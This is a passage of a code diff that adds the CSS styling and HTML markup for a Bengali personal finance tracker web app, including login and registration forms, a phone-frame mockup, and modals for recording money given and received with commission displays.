+@keyframes bgPulse{0%{transform:scale(1)}100%{transform:scale(1.05) translate(1%,1%)}}
+
+/* Earth decorations */
+.earth-deco{position:fixed;right:-80px;bottom:-80px;z-index:1;width:340px;height:340px;border-radius:50%;background:radial-gradient(circle at 35% 35%,#1a4a8a,#0a2040 50%,#020d1e);border:1px solid rgba(0,136,255,.15);box-shadow:0 0 60px rgba(0,136,255,.1);animation:huerot 30s linear infinite;opacity:0.35;overflow:hidden;}
+.earth-deco::after{content:'';position:absolute;inset:0;border-radius:50%;background:repeating-linear-gradient(0deg,transparent,transparent 14px,rgba(0,212,255,.06) 14px,rgba(0,212,255,.06) 15px),repeating-linear-gradient(90deg,transparent,transparent 14px,rgba(0,212,255,.06) 14px,rgba(0,212,255,.06) 15px);}
+.earth-deco2{position:fixed;left:-60px;top:80px;z-index:1;width:200px;height:200px;border-radius:50%;background:radial-gradient(circle at 60% 40%,#0a2a0a,#051505 50%,#020508);border:1px solid rgba(0,255,159,.1);animation:huerot 20s linear infinite reverse;opacity:0.2;}
+@keyframes huerot{from{filter:hue-rotate(0deg)}to{filter:hue-rotate(360deg)}}
+.orbit-ring{position:fixed;right:-130px;bottom:-130px;z-index:1;border-radius:50%;border:1px solid rgba(0,245,196,.08);animation:spinOrbit linear infinite;pointer-events:none;}
+.orbit-ring:nth-child(1){width:480px;height:480px;animation-duration:14s;}
+.orbit-ring:nth-child(2){width:580px;height:580px;animation-duration:22s;animation-direction:reverse;border-color:rgba(0,136,255,.06)}
+@keyframes spinOrbit{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+
+.particle{position:fixed;width:2px;height:2px;background:var(--accent);border-radius:50%;pointer-events:none;animation:floatUp linear infinite;z-index:1;}
+@keyframes floatUp{from{transform:translateY(100vh);opacity:0}10%{opacity:.3}90%{opacity:.15}to{transform:translateY(-10vh);opacity:0}}
+
+/* ═══ PHONE FRAME ═══ */
+.phone-wrap{position:relative;z-index:10;width:390px;}
+.phone-shell{position:relative;background:#0a0e14;border-radius:46px;border:2px solid #1e2d3d;
+  box-shadow:0 0 0 1px rgba(0,212,255,.08),0 30px 80px rgba(0,0,0,.7),inset 0 1px 0 rgba(255,255,255,.04),0 0 60px rgba(0,128,255,.08);
+  overflow:hidden;height:820px;display:flex;flex-direction:column;}
+.phone-shell::before{content:'';position:absolute;right:-3px;top:140px;width:4px;height:65px;background:linear-gradient(180deg,#1e2d3d,#2a3d52,#1e2d3d);border-radius:0 3px 3px 0;}
+.phone-shell::after{content:'';position:absolute;right:-3px;top:220px;width:4px;height:65px;background:linear-gradient(180deg,#1e2d3d,#2a3d52,#1e2d3d);border-radius:0 3px 3px 0;}
+.phone-vol{position:absolute;left:-3px;top:160px;width:4px;height:44px;background:linear-gradient(180deg,#1e2d3d,#2a3d52,#1e2d3d);border-radius:3px 0 0 3px;}
+.phone-vol::after{content:'';position:absolute;top:56px;left:0;width:4px;height:44px;background:inherit;border-radius:3px 0 0 3px;}
+.phone-notch{position:absolute;top:12px;left:50%;transform:translateX(-50%);width:120px;height:32px;background:#060a0e;border-radius:20px;z-index:20;display:flex;align-items:center;justify-content:center;border:1px solid #1a2535;}
+.notch-cam{width:12px;height:12px;border-radius:50%;background:radial-gradient(circle at 35% 35%,#1a3a5c,#040810);border:1px solid #0d1e30;margin-right:5px;}
+.notch-speaker{width:52px;height:5px;border-radius:3px;background:#0d1820;border:1px solid #1a2535;}
+.phone-screen{flex:1;overflow:hidden;position:relative;padding-top:50px;background:var(--bg);display:flex;flex-direction:column;}
+.phone-screen::before{content:'';position:absolute;inset:0;z-index:0;background-image:linear-gradient(rgba(0,212,255,0.025) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,0.025) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;}
+.phone-screen::after{content:'';position:absolute;inset:0;z-index:0;background:radial-gradient(ellipse at 30% 20%,rgba(0,128,255,0.06) 0%,transparent 50%),radial-gradient(ellipse at 70% 80%,rgba(0,212,255,0.04) 0%,transparent 50%);pointer-events:none;}
+.status-bar{position:absolute;top:50px;left:0;right:0;height:28px;z-index:15;display:flex;align-items:center;justify-content:space-between;padding:0 18px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--text2);background:rgba(5,10,15,.8);}
+.sb-time{font-weight:700;color:var(--text)}
+.sb-icons{display:flex;align-items:center;gap:4px;color:var(--text2)}
+.home-indicator{position:absolute;bottom:8px;left:50%;transform:translateX(-50%);width:120px;height:4px;border-radius:2px;background:rgba(0,212,255,.15);z-index:20;}
+.phone-bottom-fade{position:absolute;bottom:20px;left:0;right:0;height:30px;background:linear-gradient(transparent,rgba(5,10,15,.5));pointer-events:none;z-index:9;}
+
+/* ═══ APP ROOT ═══ */
+.app-root{position:absolute;inset:0;top:78px;bottom:0;z-index:5;display:flex;flex-direction:column;overflow:hidden;}
+.page{display:none;flex-direction:column;height:100%}
+.page.active{display:flex}
+
+/* ═══ AUTH PAGE ═══ */
+#auth-page{align-items:center;justify-content:center;background:radial-gradient(ellipse at 50% 0%,rgba(0,255,159,0.06) 0%,transparent 55%);padding:16px;overflow-y:auto;}
+.auth-card{width:100%;background:var(--surface);border:1px solid var(--border);border-radius:20px;padding:28px 24px;box-shadow:var(--shadow);animation:scaleIn .4s cubic-bezier(0.16,1,0.3,1);position:relative;overflow:hidden;}
+.auth-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent2),var(--accent),var(--accent3));}
+.auth-logo{text-align:center;margin-bottom:22px}
+.auth-logo .globe-wrap{width:72px;height:72px;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;background:radial-gradient(circle at 35% 35%,rgba(0,255,159,0.3) 0%,rgba(0,128,255,0.2) 50%,transparent 70%),linear-gradient(135deg,#030f1a,#051a1a);border-radius:50%;border:1.5px solid rgba(0,255,159,0.3);box-shadow:0 0 30px rgba(0,255,159,0.2);animation:float 3s ease-in-out infinite;font-size:34px;position:relative;}
+.auth-logo .globe-wrap::after{content:'';position:absolute;inset:4px;border-radius:50%;background:repeating-linear-gradient(0deg,transparent,transparent 7px,rgba(0,212,255,0.06) 7px,rgba(0,212,255,0.06) 8px),repeating-linear-gradient(90deg,transparent,transparent 7px,rgba(0,212,255,0.06) 7px,rgba(0,212,255,0.06) 8px);}
+.auth-logo h1{font-size:20px;font-weight:800;color:#fff;letter-spacing:1px;font-family:'Rajdhani',sans-serif}
+.auth-logo p{font-size:10px;color:var(--text3);margin-top:3px;font-family:'Share Tech Mono',monospace;letter-spacing:1px}
+.auth-tabs{display:flex;gap:5px;margin-bottom:20px;background:rgba(0,0,0,0.2);border-radius:10px;padding:4px}
+.auth-tab{flex:1;padding:8px;border-radius:7px;border:none;background:transparent;color:var(--text3);font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:700;cursor:pointer;transition:all .2s;}
+.auth-tab.active{background:rgba(0,212,255,0.12);border:1px solid rgba(0,212,255,0.3);color:var(--accent);}
+
+/* ═══ INPUTS ═══ */
+.field{margin-bottom:12px}
+.field label{font-size:9px;color:var(--text3);font-weight:700;display:block;margin-bottom:5px;text-transform:uppercase;letter-spacing:1.5px;font-family:'Share Tech Mono',monospace;}
+.inp{width:100%;padding:11px 13px;border-radius:8px;border:1px solid var(--border);background:var(--surface2);color:var(--text);font-family:'Baloo Da 2',sans-serif;font-size:14px;outline:none;transition:all .2s;}
+.inp:focus{border-color:rgba(0,212,255,0.4);background:rgba(0,212,255,0.04);box-shadow:0 0 0 3px rgba(0,212,255,0.06)}
+.inp::placeholder{color:var(--text3);font-size:12px}
+.inp[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
+/* READ-ONLY commission field style */
+.inp[readonly]{background:rgba(255,170,0,0.06);border-color:rgba(255,170,0,0.3);color:var(--gold);cursor:not-allowed;}
+
+/* ═══ BUTTONS ═══ */
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:7px;padding:10px 18px;border-radius:8px;border:none;cursor:pointer;font-family:'Rajdhani',sans-serif;font-size:14px;font-weight:700;letter-spacing:0.5px;transition:all .2s;}
+.btn:disabled{opacity:0.4;cursor:not-allowed;transform:none!important}
+.btn-primary{background:linear-gradient(135deg,var(--green2),var(--green));color:#050a0f;box-shadow:0 4px 20px rgba(0,255,159,0.3);width:100%;padding:12px;}
+.btn-primary:hover:not(:disabled){transform:translateY(-1px);box-shadow:var(--glow-g)}
+.btn-blue{background:linear-gradient(135deg,var(--blue2),var(--accent));color:#050a0f;box-shadow:0 4px 20px rgba(0,212,255,0.3)}
+.btn-blue:hover:not(:disabled){transform:translateY(-1px);box-shadow:var(--glow-b)}
+.btn-ghost{background:rgba(255,255,255,0.04);color:var(--text2);border:1px solid var(--border)}
+.btn-ghost:hover{background:rgba(255,255,255,0.08);color:var(--text)}
+.btn-danger{background:var(--red-bg);color:var(--red);border:1px solid var(--red-bdr)}
+.btn-danger:hover{background:rgba(255,68,85,0.18)}
+.btn-danger-solid{background:linear-gradient(135deg,#cc1122,var(--red));color:#fff;border:none;}
+.btn-danger-solid:hover:not(:disabled){transform:translateY(-1px);box-shadow:0 4px 20px rgba(255,68,85,0.4)}
+.btn-sm{padding:5px 12px;font-size:12px;border-radius:6px;gap:4px}
+.err-msg{font-size:11px;color:var(--red);margin-top:6px;padding:7px 11px;background:var(--red-bg);border:1px solid var(--red-bdr);border-radius:8px;display:none;font-family:'Share Tech Mono',monospace;}
+.err-msg.show{display:block;animation:fadeIn .2s ease}
+
+/* ═══ APP PAGE ═══ */
+#app-page{background:transparent;overflow:hidden}
+.topbar{flex-shrink:0;z-index:50;display:flex;align-items:center;justify-content:space-between;padding:0 14px;height:50px;background:rgba(5,10,15,0.95);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);}
+.topbar-logo{display:flex;align-items:center;gap:7px}
+.topbar-logo .tl-icon{width:28px;height:28px;border-radius:7px;background:linear-gradient(135deg,rgba(0,128,255,0.2),rgba(0,212,255,0.1));border:1px solid rgba(0,212,255,0.3);display:flex;align-items:center;justify-content:center;font-size:13px;}
+.topbar-logo span{font-size:15px;font-weight:700;color:#fff;font-family:'Rajdhani',sans-serif;letter-spacing:1px}
+.topbar-badge{font-family:'Share Tech Mono',monospace;font-size:8px;padding:2px 7px;border-radius:20px;letter-spacing:1px;background:rgba(0,255,159,0.08);border:1px solid rgba(0,255,159,0.25);color:var(--accent3);}
+.topbar-right{display:flex;align-items:center;gap:8px}
+.user-chip{display:flex;align-items:center;gap:5px;padding:4px 10px;border-radius:20px;background:rgba(0,212,255,0.06);border:1px solid rgba(0,212,255,0.2);font-size:11px;font-weight:600;color:var(--accent);cursor:pointer;font-family:'Share Tech Mono',monospace;transition:all .2s;}
+.user-chip::before{content:'';width:5px;height:5px;border-radius:50%;background:var(--accent3);box-shadow:0 0 6px var(--accent3);animation:blink 1.5s infinite;flex-shrink:0;}
+
+/* ═══ BOTTOM NAV ═══ */
+.bottom-nav{flex-shrink:0;z-index:50;padding:5px 6px 6px;background:rgba(5,10,15,0.97);backdrop-filter:blur(20px);border-top:1px solid var(--border);display:flex;gap:2px;}
+.nav-item{flex:1;display:flex;flex-direction:column;align-items:center;gap:1px;padding:6px 3px;border-radius:9px;border:1px solid transparent;cursor:pointer;transition:all .2s;background:none;font-family:'Baloo Da 2',sans-serif;}
+.nav-item:hover{background:rgba(0,212,255,0.05)}
+.nav-item.active{background:rgba(0,212,255,0.1);border-color:rgba(0,212,255,0.25)}
+.nav-item .ni{font-size:17px}
+.nav-item .nl{font-size:8px;font-weight:700;color:var(--text3);letter-spacing:0.3px;font-family:'Share Tech Mono',monospace}
+.nav-item.active .nl{color:var(--accent)}
+
+/* ═══ CONTENT ═══ */
+.content{flex:1;overflow-y:auto;overflow-x:hidden;padding:12px 12px 10px;width:100%;-webkit-overflow-scrolling:touch;}
+.content::-webkit-scrollbar{width:3px}
+.content::-webkit-scrollbar-thumb{background:rgba(0,212,255,0.2);border-radius:99px}
+
+/* ═══ SUMMARY CARDS ═══ */
+.summary-grid{display:grid;grid-template-columns:1fr 1fr;gap:7px;margin-bottom:10px}
+.sum-card{border-radius:12px;padding:12px;display:flex;flex-direction:column;gap:2px;border:1px solid;transition:all .2s;cursor:pointer;position:relative;overflow:hidden;}
+.sum-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1.5px}
+.sum-card:active{transform:scale(0.97)}
+.sum-card.green{background:var(--green-bg);border-color:var(--green-bdr)}.sum-card.green::before{background:var(--green)}
+.sum-card.blue{background:var(--blue-bg);border-color:var(--blue-bdr)}.sum-card.blue::before{background:var(--accent)}
+.sum-card.gold{background:var(--gold-bg);border-color:var(--gold-bdr)}.sum-card.gold::before{background:var(--gold)}
+.sum-card.purple{background:rgba(155,139,255,0.07);border-color:rgba(155,139,255,0.2)}.sum-card.purple::before{background:var(--purple)}
+.sum-card .sc-icon{font-size:16px;margin-bottom:1px}
+.sum-card .sc-label{font-size:8px;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:1px;font-family:'Share Tech Mono',monospace}
+.sum-card .sc-value{font-size:17px;font-weight:800;font-family:'Share Tech Mono',monospace;line-height:1.2}
+.sum-card.green .sc-value{color:var(--green)}.sum-card.blue .sc-value{color:var(--accent)}.sum-card.gold .sc-value{color:var(--gold)}.sum-card.purple .sc-value{color:var(--purple)}
+.sum-card .sc-sub{font-size:9px;color:var(--text3);margin-top:1px}
+
+/* ═══ ACTION CARDS ═══ */
+.action-row{display:grid;grid-template-columns:1fr 1fr;gap:7px;margin-bottom:14px}
+.action-card{border-radius:13px;padding:14px;text-align:center;border:1px solid;cursor:pointer;transition:all .2s;display:flex;flex-direction:column;align-items:center;gap:4px;position:relative;overflow:hidden;}
+.action-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1.5px}
+.action-card:active{transform:scale(0.97)}
+.action-card.green{background:var(--green-bg);border-color:var(--green-bdr)}.action-card.green::before{background:var(--green)}
+.action-card.blue{background:var(--blue-bg);border-color:var(--blue-bdr)}.action-card.blue::before{background:var(--accent)}
+.action-card .ac-icon{font-size:24px;animation:float 3s ease-in-out infinite}
+.action-card.blue .ac-icon{animation-delay:.5s}
+.action-card .ac-title{font-size:13px;font-weight:800;color:#fff;font-family:'Rajdhani',sans-serif;letter-spacing:0.5px}
+.action-card .ac-sub{font-size:9px;color:var(--text3);font-family:'Share Tech Mono',monospace}
+
+/* ═══ SECTION HEADER ═══ */
+.sec-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;padding:0 2px}
+.sec-head h3{font-size:12px;font-weight:700;color:#fff;font-family:'Rajdhani',sans-serif;letter-spacing:1px;text-transform:uppercase;display:flex;align-items:center;gap:5px;}
+.sec-line{flex:1;height:1px;background:linear-gradient(90deg,var(--border),transparent);margin-left:7px}
+
+/* ═══ HISTORY LIST ═══ */
+.hist-card{background:var(--surface);border:1px solid var(--border);border-radius:13px;overflow:hidden;margin-bottom:8px;box-shadow:0 4px 20px rgba(0,0,0,0.2);}
+/* ✅ FIX: smooth add/remove animation */
+.hist-item{display:flex;align-items:center;gap:10px;padding:11px 12px;border-bottom:1px solid rgba(26,58,92,0.5);transition:all .3s cubic-bezier(0.16,1,0.3,1);cursor:pointer;animation:itemSlideIn .35s cubic-bezier(0.16,1,0.3,1) both;}
+@keyframes itemSlideIn{from{opacity:0;transform:translateY(-8px) scale(0.98)}to{opacity:1;transform:translateY(0) scale(1)}}
+.hist-item.removing{animation:itemSlideOut .28s ease forwards!important;}
+@keyframes itemSlideOut{from{opacity:1;transform:translateY(0);max-height:80px;padding:11px 12px}to{opacity:0;transform:translateY(-6px);max-height:0;padding:0 12px}}
+.hist-item:last-child{border-bottom:none}
+.hist-item:active{background:rgba(0,212,255,0.04)}
+.hist-dot{width:34px;height:34px;border-radius:9px;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0;}
+.hist-dot.green{background:var(--green-bg);border:1px solid var(--green-bdr)}
+.hist-dot.blue{background:var(--blue-bg);border:1px solid var(--blue-bdr)}
+.hist-dot.red{background:var(--red-bg);border:1px solid var(--red-bdr)}
+.hist-body{flex:1;min-width:0}
+/* ✅ FIX: text truncation for long notes */
+.hist-title{font-size:12px;font-weight:600;color:var(--text);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:160px;}
+.hist-sub{font-size:9px;color:var(--text3);margin-top:2px;font-family:'Share Tech Mono',monospace}
+.hist-right{text-align:right;flex-shrink:0;display:flex;flex-direction:column;align-items:flex-end;gap:3px}
+.hist-amount{font-size:13px;font-weight:800;font-family:'Share Tech Mono',monospace}
+.hist-amount.green{color:var(--green)}.hist-amount.blue{color:var(--accent)}.hist-amount.gold{color:var(--gold)}
+
+/* ═══ BADGE ═══ */
+.badge{display:inline-flex;align-items:center;padding:1px 6px;border-radius:20px;font-size:8px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;font-family:'Share Tech Mono',monospace}
+.badge-green{background:var(--green-bg);color:var(--green);border:1px solid var(--green-bdr)}
+.badge-blue{background:var(--blue-bg);color:var(--accent);border:1px solid var(--blue-bdr)}
+.badge-gold{background:var(--gold-bg);color:var(--gold);border:1px solid var(--gold-bdr)}
+.badge-red{background:var(--red-bg);color:var(--red);border:1px solid var(--red-bdr)}
+
+/* ═══ MODAL ═══ */
+.modal-overlay{position:absolute;inset:0;z-index:200;background:rgba(3,8,13,0.88);backdrop-filter:blur(10px);display:flex;align-items:flex-end;justify-content:center;animation:fadeIn .2s ease;}
+.modal-overlay.center{align-items:center;padding:14px}
+.modal-box{background:var(--surface);border:1px solid var(--border);border-radius:20px 20px 0 0;padding:20px;width:100%;animation:slideUp .35s cubic-bezier(0.16,1,0.3,1);max-height:88%;overflow-y:auto;position:relative;}
+.modal-box::before{content:'';position:absolute;top:0;left:0;right:0;height:1.5px;background:linear-gradient(90deg,var(--accent2),var(--accent),var(--accent3));border-radius:20px 20px 0 0}
+.modal-box.center-box{border-radius:18px;animation:scaleIn .3s cubic-bezier(0.16,1,0.3,1);max-width:100%;}
+.modal-box.center-box::before{border-radius:18px 18px 0 0}
+.modal-handle{width:30px;height:3px;background:rgba(0,212,255,0.2);border-radius:99px;margin:0 auto 16px}
+.modal-title{font-size:17px;font-weight:800;color:#fff;margin-bottom:4px;font-family:'Rajdhani',sans-serif;letter-spacing:1px}
+.modal-sub{font-size:10px;color:var(--text3);margin-bottom:16px;font-family:'Share Tech Mono',monospace}
+
+/* Commission display (read-only) */
+.comm-display{margin-top:5px;padding:8px 12px;background:rgba(255,170,0,0.08);border:1px solid rgba(255,170,0,0.3);border-radius:8px;display:none;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--gold);font-weight:700;}
+.comm-display.show{display:flex;align-items:center;justify-content:space-between;animation:fadeIn .2s ease}
+
+/* Password confirm modal */
+.pass-modal{position:absolute;inset:0;z-index:300;background:rgba(3,8,13,0.92);backdrop-filter:blur(12px);display:none;align-items:center;justify-content:center;padding:16px;}
+.pass-modal.show{display:flex}
+.pass-box{background:var(--surface);border:1px solid var(--red-bdr);border-radius:18px;padding:24px;width:100%;animation:scaleIn .3s cubic-bezier(0.34,1.56,0.64,1);text-align:center;box-shadow:0 0 50px rgba(255,68,85,0.15);}
+
+/* ═══ TOAST ═══ */
+.toast-wrap{position:absolute;bottom:72px;left:50%;transform:translateX(-50%);z-index:9999;display:flex;flex-direction:column;gap:5px;align-items:center;pointer-events:none;width:92%;}
+.toast{padding:8px 16px;border-radius:10px;font-size:11px;font-weight:700;backdrop-filter:blur(16px);color:white;box-shadow:0 8px 30px rgba(0,0,0,0.5);animation:fadeUp .3s ease;font-family:'Share Tech Mono',monospace;letter-spacing:0.5px;max-width:100%;text-align:center;}
+.toast-green{background:rgba(0,180,100,0.9);border:1px solid rgba(0,255,159,0.4)}
+.toast-red{background:rgba(200,30,40,0.9);border:1px solid rgba(255,68,85,0.4)}
+.toast-blue{background:rgba(0,100,200,0.9);border:1px solid rgba(0,212,255,0.4)}
+
+/* ═══ EMPTY ═══ */
+.empty{text-align:center;padding:38px 16px;color:var(--text3)}
+.empty .ei{font-size:36px;margin-bottom:10px;opacity:0.4}
+.empty p{font-size:12px;font-family:'Share Tech Mono',monospace}
+
+/* DATA ROWS */
+.data-row{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border2)}
+.data-row:last-child{border-bottom:none}
+.data-row-label{font-size:11px;color:var(--text2)}
+/* ✅ FIX: ensure value text is readable */
+.data-row-value{font-size:12px;font-weight:700;font-family:'Share Tech Mono',monospace;color:var(--text);text-align:right;word-break:break-word;max-width:55%;}
+
+/* LOADER */
+.loader{display:inline-block;width:14px;height:14px;border:2px solid rgba(0,212,255,0.2);border-top-color:var(--accent);border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle}
+
+/* RECOVERY tag */
+.recovery-tag{background:var(--red-bg);border:1px solid var(--red-bdr);border-radius:6px;padding:2px 6px;font-size:8px;font-weight:700;color:var(--red);font-family:'Share Tech Mono',monospace;text-transform:uppercase;}
+
+/* ═══ ANIMATIONS ═══ */
+@keyframes fadeUp{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:translateY(0)}}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+@keyframes scaleIn{from{opacity:0;transform:scale(0.9)}to{opacity:1;transform:scale(1)}}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes slideUp{from{opacity:0;transform:translateY(22px)}to{opacity:1;transform:translateY(0)}}
+.fu{animation:fadeUp .4s cubic-bezier(0.16,1,0.3,1) both}
+
+/* Page loader */
+#pageLoader{position:fixed;inset:0;background:#020810;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:16px;z-index:99999;transition:opacity .5s}
+
+@media(max-width:420px){.phone-wrap{width:100%;max-width:390px}.phone-shell{border-radius:36px;height:100dvh;height:100vh}body{align-items:flex-start}}
+@media(min-width:421px){.earth-deco,.earth-deco2,.orbit-ring{display:block}}
+@media(max-width:420px){.earth-deco,.earth-deco2,.orbit-ring{display:none}}
+</style>
+</head>
+<body>
+
+<div class="orbit-ring"></div>
+<div class="orbit-ring"></div>
+<div class="earth-deco"></div>
+<div class="earth-deco2"></div>
+
+<!-- Page loader -->
+<div id="pageLoader">
+  <div style="font-size:1.6rem;font-weight:900;letter-spacing:4px;color:#00d4ff;text-shadow:0 0 30px rgba(0,212,255,0.5);font-family:'Rajdhani',sans-serif">হিসাব<span style="color:#00ff9f">নোট</span></div>
+  <div style="width:160px;height:2px;background:rgba(0,212,255,0.1);border-radius:99px;overflow:hidden">
+    <div id="loaderBar" style="height:100%;width:0;background:linear-gradient(90deg,#0080ff,#00d4ff,#00ff9f);border-radius:99px;transition:width 1s ease"></div>
+  </div>
+  <div style="font-size:0.65rem;color:var(--text3);letter-spacing:2px;font-family:'Share Tech Mono',monospace">LOADING...</div>
+</div>
+
+<!-- ══ PHONE FRAME ══ -->
+<div class="phone-wrap">
+<div class="phone-shell">
+  <div class="phone-vol"></div>
+  <div class="phone-notch"><div class="notch-cam"></div><div class="notch-speaker"></div></div>
+  <div class="phone-screen">
+    <div class="status-bar">
+      <span class="sb-time" id="status-time">9:41</span>
+      <div class="sb-icons"><span style="font-size:9px">●●●</span><span style="font-size:10px">WiFi</span><span style="font-size:9px">🔋</span></div>
+    </div>
+
+    <div class="app-root">
+
+      <!-- ══ AUTH PAGE ══ -->
+      <div id="auth-page" class="page active">
+        <div class="auth-card">
+          <div class="auth-logo">
+            <div class="globe-wrap">📒</div>
+            <h1>হিসাব নোট</h1>
+            <p>PERSONAL FINANCE TRACKER</p>
+          </div>
+          <div class="auth-tabs">
+            <button class="auth-tab active" onclick="switchAuth('login')">লগইন</button>
+            <button class="auth-tab" onclick="switchAuth('register')">রেজিস্টার</button>
+          </div>
+          <div id="login-form">
+            <div class="field"><label>ইমেইল</label><input class="inp" id="l-email" type="email" placeholder="email@example.com"/></div>
+            <div class="field"><label>পাসওয়ার্ড</label><input class="inp" id="l-pass" type="password" placeholder="পাসওয়ার্ড দিন" onkeydown="if(event.key==='Enter')doLogin()"/></div>
+            <div class="err-msg" id="l-err"></div>
+            <button class="btn btn-primary" id="l-btn" onclick="doLogin()" style="margin-top:8px">🔑 লগইন</button>
+          </div>
+          <div id="register-form" style="display:none">
+            <div class="field"><label>আপনার নাম</label><input class="inp" id="r-name" type="text" placeholder="নাম লিখুন"/></div>
+            <div class="field"><label>ইমেইল</label><input class="inp" id="r-email" type="email" placeholder="email@example.com"/></div>
+            <div class="field"><label>পাসওয়ার্ড</label><input class="inp" id="r-pass" type="password" placeholder="কমপক্ষে ৬ অক্ষর"/></div>
+            <div class="err-msg" id="r-err"></div>
+            <button class="btn btn-primary" id="r-btn" onclick="doRegister()" style="margin-top:8px">✅ রেজিস্টার</button>
+          </div>
+          <p style="text-align:center;font-size:9px;color:var(--text3);margin-top:16px;font-family:'Share Tech Mono',monospace;letter-spacing:1px">Copyright © JOYNAL ABEDIN</p>
+        </div>
+      </div>
+
+      <!-- ══ APP PAGE ══ -->
+      <div id="app-page" class="page">
+        <div class="topbar">
+          <div class="topbar-logo">
+            <div class="tl-icon">📒</div>
+            <span>হিসাব নোট</span>
+            <span class="topbar-badge">LIVE</span>
+          </div>
+          <div class="topbar-right">
+            <div class="user-chip" onclick="showLogoutModal()"><span id="user-name-chip">—</span></div>
+          </div>
+        </div>
+        <div class="content" id="main-content"></div>
+        <nav class="bottom-nav">
+          <button class="nav-item active" onclick="setPage('home')" id="nav-home"><span class="ni">🏠</span><span class="nl">হোম</span></button>
+          <button class="nav-item" onclick="setPage('dilam')" id="nav-dilam"><span class="ni">💸</span><span class="nl">দিলাম</span></button>
+          <button class="nav-item" onclick="setPage('pelam')" id="nav-pelam"><span class="ni">💰</span><span class="nl">পেলাম</span></button>
+          <button class="nav-item" onclick="setPage('activity')" id="nav-activity"><span class="ni">📋</span><span class="nl">অ্যাক্টিভিটি</span></button>
+          <button class="nav-item" onclick="setPage('recovery')" id="nav-recovery"><span class="ni">♻️</span><span class="nl">রিকভারি</span></button>
+        </nav>
+      </div>
+
+      <!-- ══ MODALS ══ -->
+
+      <!-- দিলাম modal -->
+      <div class="modal-overlay" id="modal-dilam" onclick="closeModal('modal-dilam')" style="display:none">
+        <div class="modal-box" onclick="event.stopPropagation()">
+          <div class="modal-handle"></div>
+          <div class="modal-title">💸 টাকা দিলাম</div>
+          <div class="modal-sub">NEW OUTGOING ENTRY</div>
+          <div class="field"><label>পরিমাণ (৳)</label><input class="inp" id="dilam-amount" type="number" min="0" step="0.01" placeholder="০.০০" oninput="calcDilamAmount()"/></div>
+          <div class="field"><label>বিবরণ (ঐচ্ছিক)</label><input class="inp" id="dilam-note" type="text" placeholder="কাকে দিলেন, কী কারণে..."/></div>
+          <div class="field">
+            <label>ধরন নির্বাচন করুন</label>
+            <select class="inp" id="dilam-type" onchange="calcDilamAmount()" style="cursor:pointer;appearance:auto">
+              <option value="normal">স্বাভাবিক (Normal)</option>
+              <option value="cashout">ক্যাশ আউট (Cash Out +১.৮৫%)</option>
+            </select>
+          </div>
+          <div class="comm-display" id="dilam-cashout-display" style="display:none">
+            <span style="opacity:0.7">ক্যাশ আউট চার্জ</span>
+            <span id="dilam-cashout-val" style="font-size:13px">৳০.০০</span>
+          </div>
+          <div style="display:flex;gap:10px;margin-top:10px">
+            <button class="btn btn-ghost" style="flex:1" onclick="closeModal('modal-dilam')">বাতিল</button>
+            <button class="btn btn-primary" style="flex:2" id="dilam-save-btn" onclick="saveDilam()">✅ সংরক্ষণ</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- পেলাম modal -->
+      <div class="modal-overlay" id="modal-pelam" onclick="closeModal('modal-pelam')" style="display:none">
+        <div class="modal-box" onclick="event.stopPropagation()">
+          <div class="modal-handle"></div>
+          <div class="modal-title">💰 টাকা পেলাম</div>
+          <div class="modal-sub">NEW INCOMING ENTRY</div>
+          <div class="field">
+            <label>পরিমাণ (৳)</label>
+            <input class="inp" id="pelam-amount" type="number" min="0" step="0.01" placeholder="০.০০" oninput="calcCommission()"/>
+            <!-- ✅ commission display (read-only, auto) -->
+            <div class="comm-display" id="comm-display">
+              <span id="comm-display-type" style="opacity:0.7">কমিশন হার</span>
+              <span id="comm-display-val" style="font-size:14px">৳০.০০</span>
+            </div>
+          </div>
+          <div class="field"><label>বিবরণ (ঐচ্ছিক)</label><input class="inp" id="pelam-note" type="text" placeholder="কে দিল, কী কারণে..."/></div>
+          <div style="display:flex;gap:10px;margin-top:10px">
+            <button class="btn btn-ghost" style="flex:1" onclick="closeModal('modal-pelam')">বাতিল</button>
+            <button class="btn btn-blue" style="flex:2" id="pelam-save-btn" onclick="savePelam()">✅ সংরক্ষণ</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Detail modal -->
+      <div class="modal-overlay center" id="modal-detail" onclick="closeModal('modal-detail')" style="display:none">
+        <div class="modal-box center-box" onclick="event.stopPropagation()" id="detail-content"></div>
+      </div>
+
+      <!-- Logout modal -->
+      <div class="modal-overlay center" id="modal-logout" onclick="closeModal('modal-logout')" style="display:none">
+        <div class="modal-box center-box" onclick="event.stopPropagation()" style="text-align:center">
+          <div style="font-size:40px;margin-bottom:10px">🚪</div>
+          <div class="modal-title">লগআউট করবেন?</div>
+          <p style="font-size:11px;color:var(--text3);margin-bottom:18px;font-family:'Share Tech Mono',monospace">আপনার সমস্ত ডেটা সেভ থাকবে।</p>
+          <div style="display:flex;gap:10px">
+            <button class="btn btn-ghost" style="flex:1" onclick="closeModal('modal-logout')">না</button>
